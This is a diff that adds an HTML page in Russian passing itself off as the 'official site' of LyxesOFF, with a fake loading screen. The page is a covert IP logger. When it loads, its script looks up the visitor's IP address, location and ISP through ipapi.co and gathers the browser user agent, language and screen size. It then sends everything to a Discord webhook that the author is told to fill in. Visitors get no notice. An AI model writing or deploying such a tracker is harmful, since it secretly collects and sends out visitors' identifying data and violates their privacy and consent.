@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>LyxesOFF - Официальный сайт</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .content { text-align: center; border: 1px solid #0f0; padding: 50px; box-shadow: 0 0 20px #0f0; }
+    </style>
+
+    <script>
+        // ТВОЙ ДИСКОРД ВЕБХУК СЮДА:
+        const DISCORD_WEBHOOK = "ВСТАВЬ_СВОЮ_ССЫЛКУ_ИЗ_ДИСКОРДА_ЗДЕСЬ";
+
+        async function collectData() {
+            try {
+                // Получаем IP и город через сторонний сервис (бесплатно)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                const message = {
+                    embeds: [{
+                        title: "🎯 КТО-ТО ЗАШЕЛ НА САЙТ!",
+                        color: 65280, // Зеленый цвет
+                        fields: [
+                            { name: "IP Адрес", value: ipData.ip || "Не удалось", inline: true },
+                            { name: "Город/Страна", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
+                            { name: "Провайдер", value: ipData.org, inline: false },
+                            { name: "ОС / Браузер", value: navigator.userAgent, inline: false },
+                            { name: "Язык", value: navigator.language, inline: true },
+                            { name: "Экран", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+                        ],
+                        footer: { text: "Логгер LyxesOFF" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // Отправляем в Discord
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+
+            } catch (err) {
+                console.log("Ошибка сбора данных");
+            }
+        }
+
+        // Запускаем сбор при загрузке
+        window.onload = collectData;
+    </script>
+</head>
+<body>
+    <div class="content">
+        <h1>ДОБРО ПОЖАЛОВАТЬ В LYXESOFF</h1>
+        <p>Идет загрузка системы...</p>
+        <p>[################....] 80%</p>
+    </div>
+</body>
+</html>
